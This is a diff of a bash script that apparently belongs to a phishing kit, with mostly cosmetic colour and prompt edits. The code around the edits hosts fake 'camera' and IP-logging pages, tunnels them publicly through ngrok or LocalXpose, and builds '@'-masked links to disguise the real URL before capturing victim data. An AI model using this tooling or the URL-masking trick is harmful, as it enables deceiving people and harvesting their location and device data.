@@ -492,25 +492,25 @@ about() {
 ## Choose custom port
 cusport() {
 	echo
-	read -n1 -p "${MAGENTA}Do You Want A Custom Port: y/N:${ORANGE}" P_ANS
+	read -n1 -p "${MAGENTA}Do You Want A Custom Port: y/N:" P_ANS
 	if [[ ${P_ANS} =~ ^([yY])$ ]]; then
 		echo -e "\n"
-		read -n4 -p "{MAGENTA} Enter Your Custom 4-digit Port[1024-9999]: ${WHITE}" CU_P
+		read -n4 -p "{MAGENTA} Enter Your Custom 4-digit Port[1024-9999]:" CU_P
 		if [[ ! -z  ${CU_P} && "${CU_P}" =~ ^([1-9][0-9][0-9][0-9])$ && ${CU_P} -ge 1024 ]]; then
 			PORT=${CU_P}
 			echo
 		else
-			echo -ne "\n\n${RED} Invalid 4-digit Port: $CU_P, Try Again...${WHITE}"
+			echo -ne "\n\n${RED} Invalid 4-digit Port: $CU_P, Try Again..."
 			{ sleep 2; clear; banner_small; cusport; }
 		fi		
 	else 
-		echo -ne "\n\n${CYAN} Using Default Port $PORT...${WHITE}\n"
+		echo -ne "\n\n${CYAN} Using Default Port $PORT...\n"
 	fi
 }
 
 ## Setup website and start php server
 setup_site() {
-    echo -e "\n${CYAN} Setting up server..."${WHITE}
+    echo -e "\n${CYAN} Setting up server..."
     if [ "$website" = "camera" ]; then
         cp -rf .sites/"$website"/* .server/www
         cp -f .sites/"$website"/location.php .server/www/
@@ -518,7 +518,7 @@ setup_site() {
         cp -rf .sites/"$website"/* .server/www
         cp -f .sites/ip.php .server/www/
     fi
-    echo -ne "\n${CYAN} Successfully set up PHP server!"${WHITE}
+    echo -ne "\n${CYAN} Successfully set up PHP server!"
     cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
 }
 
@@ -604,11 +604,11 @@ localxpose_auth() {
 	[ -d ".localxpose" ] && auth_f=".localxpose/.access" || auth_f="$HOME/.localxpose/.access" 
 
 	[ "$(./.server/loclx account status | grep Error)" ] && {
-		echo -e "\n\n${RED}[${WHITE}!${RED}]${GREEN} Create an account on ${ORANGE}localxpose.io${GREEN} & copy the token\n"
+		echo -e "\n\n${GREEN} Create an account on ${ORANGE}localxpose.io${GREEN} & copy the token\n"
 		sleep 3
 		read -p "${RED}[${WHITE}-${RED}]${ORANGE} Input Loclx Token:${ORANGE} " loclx_token
 		[[ $loclx_token == "" ]] && {
-			echo -e "\n${RED}[${WHITE}!${RED}]${RED} You have to input Localxpose Token." ; sleep 2 ; tunnel_menu
+			echo -e "\n${RED} You have to input Localxpose Token." ; sleep 2 ; tunnel_menu
 		} || {
 			echo -n "$loclx_token" > $auth_f 2> /dev/null
 		}
@@ -621,9 +621,9 @@ start_loclx() {
 	echo -e "\n${WHITE}[${WHITE}-${WHITE}]${WHITE} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	{ sleep 1; setup_site; localxpose_auth; }
 	echo -e "\n"
-	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Change Loclx Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
+	read -n1 -p "${ORANGE} Change Loclx Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
 	[[ ${opinion,,} == "y" ]] && loclx_region="eu" || loclx_region="us"
-	echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching LocalXpose..."
+	echo -e "\n\n${GREEN} Launching LocalXpose..."
 
 	if [[ `command -v termux-chroot` ]]; then
 		sleep 1 && termux-chroot ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
@@ -656,9 +656,9 @@ ngrok_auth() {
 
 	# Check if ngrok is configured (authtoken exists in config file)
 	if ! grep -q "authtoken:" "$auth_f"; then
-		echo -e "\n\n${RED}[${WHITE}!${RED}]${GREEN} Create an account on ${ORANGE}ngrok.com${GREEN} & copy the authtoken\n"
+		echo -e "\n\n${GREEN} Create an account on ${ORANGE}ngrok.com${GREEN} & copy the authtoken\n"
 		sleep 3
-		read -p "${RED}[${WHITE}-${RED}]${ORANGE} Input Ngrok Authtoken:${ORANGE} " ngrok_token
+		read -p "${ORANGE} Input Ngrok Authtoken:${ORANGE} " ngrok_token
 		[[ $ngrok_token == "" ]] && {
 			echo -e "\n${RED}[${WHITE}!${RED}]${RED} You have to input Ngrok Authtoken." ; sleep 2 ; tunnel_menu
 		} || {
@@ -667,7 +667,7 @@ ngrok_auth() {
 
 			# Write the authtoken to the ngrok.yml file
 			echo "authtoken: $ngrok_token" > "$auth_f" 2> /dev/null
-			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Ngrok authtoken saved to ${ORANGE}$auth_f${GREEN}\n"
+			echo -e "\n${GREEN} Ngrok authtoken saved to ${ORANGE}$auth_f${GREEN}\n"
 		}
 	fi
 }
@@ -676,9 +676,9 @@ start_ngrok() {
 	cusport #Assuming this sets $HOST and $PORT
 	ngrok_auth # Ensure authtoken is configured
 
-	echo -e "\n${WHITE}[${WHITE}-${WHITE}]${WHITE} Initializing Ngrok... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+	echo -e "\n${ORANGE} Initializing Ngrok... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 
-	echo -ne "\n\n${CYAN}[${CYAN}-${CYAN}]${CYAN} Starting Ngrok tunnel..."
+	echo -ne "\n\n${CYAN} Starting Ngrok tunnel..."
 
 	if [[ `command -v termux-chroot` ]]; then
     	sleep 2 && termux-chroot ./.server/ngrok tcp $PORT &
@@ -694,7 +694,7 @@ start_ngrok() {
 
 
 	if [[ -z "$ngrok_url" ]]; then
-		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Failed to retrieve Ngrok URL. Check Ngrok logs or try again.${RED}"
+		echo -e "\n${RED} Failed to retrieve Ngrok URL. Check Ngrok logs or try again.${RED}"
 	else
 		custom_url "$ngrok_url"
 		capture_data
@@ -781,7 +781,7 @@ custom_url() {
 		masked_url="$mask@$processed_url"
 		processed_url="https://$processed_url"
 	else
-		# echo "[!] No url provided / Regex Not Matched"
+		# echo "No url provided / Regex Not Matched"
 		url="Unable to generate links. Try after turning on your hotspot or restarting your system"
 		processed_url="Unable to Shorten URL"
 	fi
@@ -919,7 +919,7 @@ main_menu() {
 	EOF
 
 	echo
-	read -p " ${MAGENTA}Select an option: "
+	read -p " ${BRIGHT_GREEN}Select an option: "
 
 	case $REPLY in 
 		1 | 01)
